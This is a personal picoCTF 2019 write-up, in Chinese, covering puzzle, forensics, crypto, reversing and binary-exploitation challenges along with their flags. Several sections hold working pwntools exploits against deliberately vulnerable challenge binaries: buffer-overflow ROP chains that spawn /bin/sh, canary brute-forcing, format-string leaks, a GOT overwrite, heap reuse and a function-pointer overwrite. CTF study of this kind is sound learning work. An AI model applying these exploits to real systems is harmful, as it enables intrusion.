# picoCTF 2019 subsequent
## mus1c - Points: 300 - (Solves: 1560)General Skills
### review
看了別人了writeup
我服了 rockstar 這款語言的repo https://github.com/RockstarLang/rockstar
https://codewithrockstar.com/online 用這個解
噴出 ascii
### code
```
Pico's a CTFFFFFFF
my mind is waitin
It's waitin

Put my mind of Pico into This
my flag is not found
put This into my flag
put my flag into Pico


shout Pico
shout Pico
shout Pico

My song's something
put Pico into This

Knock This down, down, down
put This into CTF

shout CTF
my lyric is nothing
Put This without my song into my lyric
Knock my lyric down, down, down

shout my lyric

Put my lyric into This
Put my song with This into my lyric
Knock my lyric down

shout my lyric

Build my lyric up, up ,up

shout my lyric
shout Pico
shout It

Pico CTF is fun
security is important
Fun is fun
Put security with fun into Pico CTF
Build Fun up
shout fun times Pico CTF
put fun times Pico CTF into my song

build it up

shout it
shout it

build it up, up
shout it
shout Pico
```
picoCTF{rrrocknrn0113r}
## 1_wanna_b3_a_r0ck5tar - Points: 350 - (Solves: 1313)General Skills
跟上一題一樣
### code
```
Rocknroll is right              
Silence is wrong                
A guitar is a six-string        
Tommy's been down               
Music is a billboard-burning razzmatazz!
Listen to the music             
If the music is a guitar                  
Say "Keep on rocking!"                
Listen to the rhythm
If the rhythm without Music is nothing
Tommy is rockin guitar
Shout Tommy!                    
Music is amazing sensation
Jamming is awesome presence
Scream Music!                   
Scream Jamming!                 
Tommy is playing rock           
Scream Tommy!       
They are dazzled audiences                  
Shout it!
Rock is electric heaven                     
Scream it!
Tommy is jukebox god            
Say it!                                     
Break it down
Shout "Bring on the rock!"
Else Whisper "That ain't it, Chief"                 
Break it down
```
picoCTF{BONJOVI}
## shark on wire 1 - Points: 150 - (Solves: 3425)Forensics
### review
當初找的要死要活的 就是沒找到

無法 ~~$strings pacp |grep pico~~

要進去 找 udp or tcp stream 一個個看
>udp.stream eq 6 六是編號 wireshark 給的

>less than 小于 < lt函數真D好用
小于等于 le
其他：
等于 eq
大于 gt
大于等于 ge

然後follow stream 就可以了

picoCTF{StaT31355_636f6e6e}
## WhitePages - Points: 250 - (Solves: 1357)Forensics
### review
>hexdump -C file 替換成 xxd

有點通靈
話說 pwntools 函數真D好用
```
from pwn import *

with open('./whitepages.txt', 'rb') as f:
  data = f.read()

data  = data.replace('e28083'.decode('hex'), '0')
data  = data.replace(' ', '1')

print unbits(data)
```
picoCTF{not_all_spaces_are_created_equal_c167040c738e8bcae2109ef4be5960b1}
## leap-frog - Points: 300 - (Solves: 233)Binary Exploitation
### review
一開始看了看 覺的應該是 把 func 順序排好就好 結果不是
`if(win1 && !win1)` <----- 這怎樣都不會過阿

然後我是嘗試直接跳上 `win2=1` 這樣 stack 會死掉 東西亂光光 , 我又不信邪 想說修好stack 而已 繼續搞payload

呵呵 搞死自己

看了大大的writeup 才發現 乾 怎沒想到

它是call gets 改 win* 因為他們是連在一起的

改完跳 display_flag

### code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>


#define FLAG_SIZE 64

bool win1 = false;
bool win2 = false;
bool win3 = false;

void leapA() {
  win1 = true;
}

void leap2(unsigned int arg_check) {
  if (win3 && arg_check == 0xDEADBEEF) {
    win2 = true;
  }
  else if (win3) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void leap3() {
  if (win1 && !win1) {
    win3 = true;
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void display_flag() {
  char flag[FLAG_SIZE];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);

  if (win1 && win2 && win3) {
    printf("%s", flag);
    return;
  }
  else if (win1 || win3) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```
### payload
```
from pwn import *
r=process('./rop')
r.recvuntil('>')
raw_input(':')
#main_addr = 0x80487c9
gets_plt = 0x08048430
win1_addr = 0x0804A03D
display_flag_addr = 0x080486b3
payload = 'a'*28
payload += p32(gets_plt)              # ret1
payload += p32(display_flag_addr)     # ret2
payload += p32(win1_addr)             # ret1 arg
r.sendline(payload)
r.sendline('\x01'*3)                  # get() input
r.interactive()

```
picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_183d3d88}

~~*阿送出去 他說flag不對？？？*~~
## rop32 - Points: 400 - (Solves: 356)Binary Exploitation
### review
看到writeup 我快被我自己氣死
>ROPgadget --binary ./vuln --rop --badbytes "0a"

當初有發現 碰到`0a` 送進去的payload 就不是我要的

知道要找代替的 直接從gadget 找 我沒有找到^^

看了help 也沒有發現有 badbytes 這選項 我在幹麻

>ROPgadget --binary r32 --ropchain --badbytes "0a"
### code
```
from pwn import *
r=process('./vuln')
r.recvuntil('\n')

from struct import pack

# Padding goes here
p = 'a'*28

p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += '/bin'
p += pack('<I', 0x080da060) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4
p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += '//sh'
p += pack('<I', 0x080da064) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080da060) # padding without overwrite ebx
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x08049563) # int 0x8
r.sendline(p)
r.interactive()

```
picoCTF{rOp_t0_b1n_sH_44c05daa}
## CanaRy - Points: 300 - (Solves: 438)Binary Exploitation
### review

卡在pie的部份 知道後1.5btye 不會變

當初怎沒想到蓋1.5byte 上去

用r2 找addr
```
>>> a=bin(0x7ed)[2:]
>>> len(a)
11
```
11 byte 可以
### code
```
from pwn import *
key = ''
for i in range(4):
  for c in range(256):
    sh=process('./vuln')
    c = chr(c)
    sh.sendlineafter('> ', str(33+i))
    sh.sendlineafter('> ', 'a'*32+key+c)
    data = sh.recvall()
    if 'Stack Smashing Detected' not in data:
      key += c
      print enhex(key)
      break
```
```
from pwn import *
key = unhex('3333784f')
while 1:
        sh=process('./vuln')
        sh.sendlineafter('> ', str(32+4+12+6))
        sh.sendlineafter('> ', 'a'*32+key+'a'*(4+12)+'\xed\x07')
 # sh.interactive()
        data = sh.recvall(timeout=0.5)
        if 'pico' in data:
                print data
                break

```
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUF_SIZE 32
#define FLAG_LEN 64
#define KEY_LEN 4

void display_flag() {
  char buf[FLAG_LEN];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }
  fgets(buf,FLAG_LEN,f);
  puts(buf);
  fflush(stdout);
}

char key[KEY_LEN];
void read_canary() {
  FILE *f = fopen("/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/canary.txt","r");
  if (f == NULL) {
    printf("[ERROR]: Trying to Read Canary\n");
    exit(0);
  }
  fread(key,sizeof(char),KEY_LEN,f);
  fclose(f);
}

void vuln(){
   char canary[KEY_LEN];
   char buf[BUF_SIZE];
   char user_len[BUF_SIZE];

   int count;
   int x = 0;
   memcpy(canary,key,KEY_LEN);
   printf("Please enter the length of the entry:\n> ");

   while (x<BUF_SIZE) {
      read(0,user_len+x,1);
      if (user_len[x]=='\n') break;
      x++;
   }
   sscanf(user_len,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,key,KEY_LEN)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  read_canary();
  vuln();

  return 0;
}
```
picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}


~~*他說flag不對*~~

## asm4 - Points: 400 - (Solves: 432)Reverse Engineering

看writeup 發現 日本跟我們的題目不一樣 且 flag 也不一樣

一開始把 asm 改好 編起來 丟 ida

---
以下是心路歷程

一開始 是改好 加上 _start  變數設好 call asm4

但是出來的答案就是不對 我看了stack變化 也覺得怪 猜說應該是我的傳參數的問題

那時候因為ubuntu 沒有 ida decompiler 所以沒看

阿hopper翻出來 又怪怪的
```
signed int __cdecl asm4(int fun_in)
{
  signed int ret_val; // [esp+4h] [ebp-10h]
  int loop_i; // [esp+8h] [ebp-Ch]
  int loop_j; // [esp+Ch] [ebp-8h]

  ret_val = 0x280;
  for ( loop_i = 0; *(_BYTE *)(loop_i + fun_in); ++loop_i )
    ;
  for ( loop_j = 1; loop_j < loop_i - 1; ++loop_j )
    ret_val += *(char *)(loop_j + fun_in)       // useless
             - *(char *)(loop_j - 1 + fun_in)
             + *(char *)(loop_j + 1 + fun_in)
             - *(char *)(loop_j + fun_in);      // useless
  return ret_val;
}
```
```
s="picoCTF_e341d"

print(len(s))
val=0x280

for i in range(1,len(s)-1):
    val += (ord(s[i+1]))
    val -= (ord(s[i-1]))
print(hex(val))

```
有位日本大大事這樣做的

solve.c
```
#include <stdio.h>

int main(void)
{
    printf("picoCTF{0x%x}\n", asm4("picoCTF_d899a"));
    return 0;
}
```
>$ gcc -m32 -c tset.S -o test.o

>$ gcc -m32 -c solve.c -o solve.o -w

>$ gcc -m32 solve.o test.o

>$ ./a.out

- -c 只生成obj檔
- -w 不生成任何警告

picoCTF{0x23c}
## stringzz - Points: 300 - (Solves: 616)Binary Exploitation
### review
保護全開 當初是卡在沒想到 buf 還在stack 上

我直接gdb find 看到local 端 假的flag 是在heap上 然後我就直接放棄了

就是爆破 stack  
### code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAG_BUFFER 128
#define LINE_BUFFER_SIZE 2000

void printMessage3(char *in)
{
  puts("will be printed:\n");
  printf(in);
}
void printMessage2(char *in)
{
  puts("your input ");
  printMessage3(in);
}

void printMessage1(char *in)
{
  puts("Now ");
  printMessage2(in);
}

int main (int argc, char **argv)
{
    puts("input whatever string you want; then it will be printed back:\n");
    int read;
    unsigned int len;
    char *input = NULL;
    getline(&input, &len, stdin);
    //There is no win function, but the flag is wandering in the memory!
    char * buf = malloc(sizeof(char)*FLAG_BUFFER);
    FILE *f = fopen("flag.txt","r");
    fgets(buf,FLAG_BUFFER,f);
    printMessage1(input);
    fflush(stdout);

}

```
```
from pwn import *
# context.log_level='DEBUG'
for i in range(1,100):
    r=process('./vuln')
    r.recvuntil(':')
    payload='%'+str(i)+'$s'
    r.sendline(payload)
    recv=r.recvall()
    if '{' in recv:
        print recv
        break

```
picoCTF{str1nG_CH3353_df5265ef}
## Flags - Points: 200 - (Solves: 5547)Cryptography
### review
居然有一堆人解 我覺的這題很通靈

丟以圖搜尋沒東西
但是如果查 `flag p` `flag i ` ... 點除片就會發現它是 國際信號旗


https://zh.wikipedia.org/wiki/%E5%9C%8B%E9%9A%9B%E4%BF%A1%E8%99%9F%E6%97%97

![](https://github.com/0xdeciverAngel/picoCTF2019/blob/master/flag.png?raw=true)

PICOCTF{F1AG5AND5TUFF}
## waves over lambda - Points: 300 - (Solves: 2647)Cryptography
```
### code
-------------------------------------------------------------------------------
bfowyqpx ilyl ux sfhy vnqw - vylthlobs_ux_b_fcly_nqmarq_mhjwjloofr
-------------------------------------------------------------------------------
alpzllo hx pilyl zqx, qx u iqcl qnylqrs xqur xfmlzilyl, pil afor fv pil xlq. alxurlx ifnruow fhy ilqypx pfwlpily piyfhwi nfow jlyufrx fv xljqyqpufo, up iqr pil lvvlbp fv mqeuow hx pfnlyqop fv lqbi fpily'x sqyoxqor lclo bfocubpufox. pil nqzslypil alxp fv fnr vlnnfzxiqr, albqhxl fv iux mqos slqyx qor mqos cuyphlx, pil fons bhxiufo fo rlbe, qor zqx nsuow fo pil fons yhw. pil qbbfhopqop iqr ayfhwip fhp qnylqrs q afg fv rfmuoflx, qor zqx pfsuow qybiuplbphyqnns zupi pil afolx. mqynfz xqp byfxx-nlwwlr yuwip qvp, nlqouow qwquoxp pil mukklo-mqxp. il iqr xhoelo billex, q slnnfz bfmjnlgufo, q xpyquwip aqbe, qo qxblpub qxjlbp, qor, zupi iux qymx ryfjjlr, pil jqnmx fv iqorx fhpzqyrx, ylxlmanlr qo urfn. pil ruylbpfy, xqpuxvulr pil qobify iqr wffr ifnr, mqrl iux zqs qvp qor xqp rfzo qmfowxp hx. zl lgbiqowlr q vlz zfyrx nqkuns. qvplyzqyrx pilyl zqx xunlobl fo afqyr pil sqbip. vfy xfml ylqxfo fy fpily zl rur ofp alwuo piqp wqml fv rfmuoflx. zl vlnp mlrupqpucl, qor vup vfy ofpiuow ahp jnqbur xpqyuow. pil rqs zqx loruow uo q xlyloups fv xpunn qor lgthuxupl ayunnuqobl. pil zqply xifol jqbuvubqnns; pil xes, zupifhp q xjlbe, zqx q alouwo ummloxups fv hoxpquolr nuwip; pil clys muxp fo pil lxxlg mqyxi zqx nuel q wqhks qor yqruqop vqayub, ihow vyfm pil zffrlr yuxlx uonqor, qor ryqjuow pil nfz xifylx uo ruqjiqofhx vfnrx. fons pil wnffm pf pil zlxp, ayffruow fcly pil hjjly ylqbilx, albqml mfyl xfmayl lclys muohpl, qx uv qowlylr as pil qjjyfqbi fv pil xho.
```
flag又不一樣 我的flag

frequency_is_c_over_lambda_mupgpennod
## GoT - Points: 350 - (Solves: 440)Binary Exploitation
### code
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```
部份可寫 經過測試 puts 不能寫 exit 可以寫
```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define FLAG_BUFFER 128

void win() {
  char buf[FLAG_BUFFER];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAG_BUFFER,f);
  puts(buf);
  fflush(stdout);
}


int *pointer;

int main(int argc, char *argv[])
{

   puts("You can just overwrite an address, what can you do?\n");
   puts("Input address\n");
   scanf("%d",&pointer);
   puts("Input value?\n");
   scanf("%d",pointer);
   puts("The following line should print the flag\n");
   exit(0);
}
```
```
from pwn import *
context.log_level='debug'
r=process('./got')
e=ELF('./got')
puts_got=e.got['puts']
exit_got=e.got['exit']
win=e.symbols['win']
# print(hex(win))
# print(hex(exit_got))
# print(type(hex(win)))
r.sendlineafter('address\n',str(exit_got))
r.sendlineafter('value?\n',str(win))

r.recvall()
# r.interactive()
```
不用p32 因為他是吃int

picoCTF{A_s0ng_0f_1C3_and_f1r3_2a9d1eaf}
## seed-sPRiNG - Points: 350 - (Solves: 420)Binary Exploitation
### review
搞了一個下午  pico 應該是有防作弊之類的

你看看 日本人寫的writeup port 是 4160

奸詐的題目 local 測試時 seed 很老實的就是 time(0)

```
|           0x00000889      83c410         add esp, 0x10
|           0x0000088c      83ec0c         sub esp, 0xc
|           0x0000088f      6a00           push 0
|           0x00000891      e89afcffff     call sym.imp.time           ; time_t time(time_t *timer)
|           0x00000896      83c410         add esp, 0x10
|           0x00000899      8945f0         mov dword [local_10h], eax
|           0x0000089c      8b45f0         mov eax, dword [local_10h]
|           0x0000089f      83ec0c         sub esp, 0xc
|           0x000008a2      50             push eax
|           0x000008a3      e8c8fcffff     call sym.imp.srand          ; void srand(int seed)

```
阿遠端時一直不過 我想說484我的recv那些寫錯了 看了超久 或是懷疑同步失敗

害我還去同步時間

後來看了別人的解法 MD 好像要爆破 = =

結果offset 20幾 sec

說好的時間同步ㄋ？？
### code
rand.c
```
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(int argc, char **argv)
{
    int delta = atoi(argv[1]);
    //int delta=0;
    // char c;
    // printf("%d\n",delta );
    srand(time(NULL)+delta);
    for (int i=0; i<30; i++)
{

  // scanf("%cn",&c);
  printf("%d\n", rand()&0xf);

}

}

```
```
from pwn import *
# context.log_level = 'DEBUG'
for q in range(-100,100):
    try:
        # r=process('./seed_spring')

        r=remote('2019shell1.picoctf.com',45107)
        # r=remote('2019shell1.picoctf.com',4160)

        # local=process(argv=['./rand','-29'])
        local=process(argv=['./rand',str(q)])

        for i in range(30):
            rec=local.recvuntil('\n')
            recv=r.sendafter(': ',rec)

            # rec=r.recvuntil('\n')
            # if 'WRONG' in rec:
                # break

        print(q)
        r.interactive()
    except:
        print 'pass'

```

picoCTF{pseudo_random_number_generator_not_so_random_829c50d19ba2bdb441975c0dabfcc1c0}

## messy-malloc - Points: 300 - (Solves: 274)Binary Exploitation
利用 malloc 去要記憶體

然後記憶體會分配在 heap 上

因為優化的關係 如果已經有分配過32byte 大小的chunk 被free過

跟他要一塊 32byte 的話 會給你 剛剛要過得那塊

阿不知道為啥local 不行過 遠端就可以

參考:https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/messy-malloc.md

### code
```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define LINE_MAX 256
#define ACCESS_CODE_LEN 16
#define FLAG_SIZE 64

struct user {
  char *username;
  char access_code[ACCESS_CODE_LEN]; //16
  char *files;
};

struct user anon_user;          //  宣告一個未知使用者
struct user *u;					//  宣告 user pointer

void print_flag() {
  char flag[FLAG_SIZE];
  FILE *f = fopen("flag.txt", "r");
  if (f == NULL) {
    printf("Please make sure flag.txt exists\n");
    exit(0);
  }

  if ((fgets(flag, FLAG_SIZE, f)) == NULL){
    puts("Couldn't read flag file.");
    exit(1);
  };

  unsigned long ac1 = ((unsigned long *)u->access_code)[0];
  unsigned long ac2 = ((unsigned long *)u->access_code)[1];
  if (ac1 != 0x4343415f544f4f52 || ac2 != 0x45444f435f535345) {
    fprintf(stdout, "Incorrect Access Code: \"");
    for (int i = 0; i < ACCESS_CODE_LEN; i++) {
      putchar(u->access_code[i]);
    }
    fprintf(stdout, "\"\n");
    return;
  }

  puts(flag);
  fclose(f);
}

void menu() {   // 就是顯示選單
  puts("Commands:");
  puts("\tlogin - login as a user");
  puts("\tprint-flag - print the flag");
  puts("\tlogout - log out");
  puts("\tquit - exit the program");
}

const char *get_username(struct user *u) {
  if (u->username == NULL) {   //如果u的username 沒有設定就是預設
    return "anon";
  }
  else {
    return u->username;
  }
}

int login() {
//  u = malloc(sizeof(struct user));   //要一塊記憶體給 u
u = (user*)malloc(sizeof(user)); // 加上 (user*)
  int username_len;
  puts("Please enter the length of your username");
  scanf("%d", &username_len);
  getc(stdin);

  char *username = (char *)malloc(username_len+1);// 加上 (char *)
  u->username = username;

  puts("Please enter your username");
  if (fgets(username, username_len, stdin) == NULL) {
    puts("fgets failed");
    exit(-1);
  }

  char *end;
  if ((end=strchr(username, '\n')) != NULL) {
    end[0] = '\0';
  }

  return 0;

}

int logout() {
  char *user = u->username;
  if (u == &anon_user) {
    return -1;
  }
  else {
    free(u); // 清掉 u 所指向的addr
    free(user);// 清掉 u->username所指向的addr
    u = &anon_user;
  }
  return 0;
}

int main(int argc, char **argv) {

  setbuf(stdout, NULL);

  char buf[LINE_MAX];

  memset(anon_user.access_code, 0, ACCESS_CODE_LEN); //16  anon_user.access_code set to 0
  anon_user.username = NULL;

  u = &anon_user;

  menu();

  while(1) {
    puts("\n Enter your command:");
    fprintf(stdout, "[%s]> ", get_username(u));

    if(fgets(buf, LINE_MAX, stdin) == NULL)
      break;

    if (!strncmp(buf, "login", 5)){
      login();
    }
    else if(!strncmp(buf, "print-flag", 10)){
      print_flag();
    }
    else if(!strncmp(buf, "logout", 6)){
      logout();
    }
    else if(!strncmp(buf, "quit", 4)){
      return 0;
    }
    else{
      puts("Invalid option");
      menu();
    }
  }
}

```
```
from pwn import *
# context.log_level='debug'
print(p64(0x4343415f544f4f52))
print(p64(0x45444f435f535345))

r=remote('2019shell1.picoctf.com', 12286)

raw_input(':')
r.sendlineafter('>','login')
r.sendlineafter('username','32')
payload='a'*8+p64(0x4343415f544f4f52)+p64(0x45444f435f535345)+'a'*8
# payload='a'*8*0+p64(0x45444f435f535345)+p64(0x4343415f544f4f52)+'a'*8

r.sendlineafter('username',payload)
r.sendlineafter('>','logout')



r.sendlineafter('>','login')
r.sendlineafter('username','1')
r.sendlineafter('username','a')



r.sendlineafter('>','print-flag')



r.interactive()

```
~~picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_8aa9bc45}~~
picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_406af1a1}
## pointy - Points: 350 - (Solves: 354)Binary Exploitation
當初看到根本不知道要從何下手

網上大大 表示 因為 兩個結構 professor student size 一樣大 4bye

所以 lastScore 偏移會對應到 那串function pointer 看下面 asm

照main正常邏輯走 它會遇到  輸入要評分的 學生 和 教授

這裡有bug 你發現 `retrieveProfessor` `retrieveStudent`

這兩函數根本一樣 都是去從 `ADDRESSES` 找東西 阿大家東西鬥也放在裡面

就是這剛好  所以  輸入要評分的 學生 和 教授 這裡 教授可以輸入 學生的名字進去

然猴 要你輸入 分數 你就輸入 win addr 進去 蓋掉 student 裡的function pointer

它scanf 是 %u  == unsigned int

win addr
>>> 0x08048696
134514326



下次call 它 就會噴 flag

---
可以看到 它根本不管你是啥型態

你給它 東西 它就是往 offset 4 byte 裡 塞東西進去

```
fcn) sym.giveScoreToProfessor 58
|           sym.giveScoreToProfessor (int professor, int score);
            ;var int local_4h @ ebp-0x4
|           ; arg int professor @ ebp+0x8
|           ; arg int score @ ebp+0xc
|           0x0804872f      55             push ebp
|           0x08048730      89e5           mov ebp, esp
|           0x08048732      53             push ebx
|           0x08048733      83ec04         sub esp, 4
|           0x08048736      e877030000     call sym.__x86.get_pc_thunk.ax
|           0x0804873b      05c5180000     add eax, 0x18c5
|           0x08048740      8b5508         mov edx, dword [professor]  ; [0x8:4]=-1 ; 8
|           0x08048743      8b4d0c         mov ecx, dword [score]      ; [0xc:4]=-1 ; 12
|           0x08048746      898a80000000   mov dword [edx + 0x80], ecx
|           0x0804874c      83ec08         sub esp, 8
|           0x0804874f      ff750c         push dword [score]
|           0x08048752      8d906bebffff   lea edx, dword [eax - 0x1495]
|           0x08048758      52             push edx
|           0x08048759      89c3           mov ebx, eax
|           0x0804875b      e860fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048760      83c410         add esp, 0x10
|           0x08048763      90             nop
|           0x08048764      8b5dfc         mov ebx, dword [local_4h]
|           0x08048767      c9             leave
\           0x08048768      c3             ret
```

### code
```
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define FLAG_BUFFER 128
#define NAME_SIZE 128
#define MAX_ADDRESSES 1000

int ADRESSES_TAKEN=0;
void *ADDRESSES[MAX_ADDRESSES];

void win() {
    char buf[FLAG_BUFFER];
    FILE *f = fopen("flag.txt","r");
    fgets(buf,FLAG_BUFFER,f);
    puts(buf);
    fflush(stdout);
}

struct Professor {
    char name[NAME_SIZE];
    int lastScore; //4byte
};

struct Student {
    char name[NAME_SIZE];
    void (*scoreProfessor)(struct Professor*, int); //4bye
};

void giveScoreToProfessor(struct Professor* professor, int score){
    professor->lastScore=score;
    printf("Score Given: %d \n", score);

}

void* retrieveProfessor(char * name ){
    for(int i=0; i<ADRESSES_TAKEN;i++){
        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
            return ADDRESSES[i];
        }
    }
    puts("person not found... see you!");
    exit(0);
}

void* retrieveStudent(char * name ){
    for(int i=0; i<ADRESSES_TAKEN;i++){
        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
            return ADDRESSES[i];
        }
    }
    puts("person not found... see you!");
    exit(0);
}

void readLine(char * buff){
    int lastRead = read(STDIN_FILENO, buff, NAME_SIZE-1);
    if (lastRead<=1){
        exit(0);
        puts("could not read... see you!");
    }
    buff[lastRead-1]=0;
}

int main (int argc, char **argv)
{
    while(ADRESSES_TAKEN<MAX_ADDRESSES-1){
        printf("Input the name of a student\n");
        struct Student* student = (struct Student*)malloc(sizeof(struct Student)); // 要一個 addr 存 student
        ADDRESSES[ADRESSES_TAKEN]=student;
        readLine(student->name);
        printf("Input the name of the favorite professor of a student \n");
        struct Professor* professor = (struct Professor*)malloc(sizeof(struct Professor));
        ADDRESSES[ADRESSES_TAKEN+1]=professor;
        readLine(professor->name);
        student->scoreProfessor=&giveScoreToProfessor;
        ADRESSES_TAKEN+=2;
        printf("Input the name of the student that will give the score \n");
        char  nameStudent[NAME_SIZE];
        readLine(nameStudent);
        student=(struct Student*) retrieveStudent(nameStudent);
        printf("Input the name of the professor that will be scored \n");
        char nameProfessor[NAME_SIZE];
        readLine(nameProfessor);
        professor=(struct Professor*) retrieveProfessor(nameProfessor);
        puts(professor->name);
        unsigned int value;
	      printf("Input the score: \n");
	      scanf("%u", &value);
        student->scoreProfessor(professor, value);
    }
    return 0;
}
```
### execute
```
Input the name of a student
s
Input the name of the favorite professor of a student
p
Input the name of the student that will give the score
s
Input the name of the professor that will be scored
s
s
Input the score:
134514326
Score Given: 134514326
Input the name of a student
ss
Input the name of the favorite professor of a student
pp
Input the name of the student that will give the score
s
Input the name of the professor that will be scored
s
s
Input the score:
0
picoCTF{g1v1ng_d1R3Ct10n5_409abf51}
Input the name of a student



```
picoCTF{g1v1ng_d1R3Ct10n5_409abf51}
## Time's Up, Again! - Points: 450 - (Solves: 167)Reverse Engineering

搞超久 一開始想說 跟上一題一樣 pwntools eval 就好 結果那個秒數 有夠少 python 不夠快

網路上 有幾種解法
- set sigset
- c pipe 硬幹
- 用 python subprocess 搞成 pyc 執行

我試過 pipe 就是 算好的答案 導回去 就是沒反應

不知道是pipe 不對 還 已經 timeout


### code
```
#include <signal.h>
#include <unistd.h>

int main(){
    sigset_t sigs;

    sigemptyset(&sigs);
    sigaddset(&sigs, SIGALRM);
    sigprocmask(SIG_BLOCK, &sigs, 0);

    execl("./times-up-again", "times-up-again", NULL);
}


```
picoCTF{Hasten. Hurry. Ferrociously Speedy. #3230cac7}
## B1ll_Gat35 - Points: 400 - (Solves: 137)Reverse Engineering
### review
心血來潮 突然逛逛 發現 有新的題目 是 win vc++ 8.0 寫的 console 沒殼

x86dbg開 找 string 就找到了 超級87



PICOCTF{These are the access codes to the vault: 1063340}
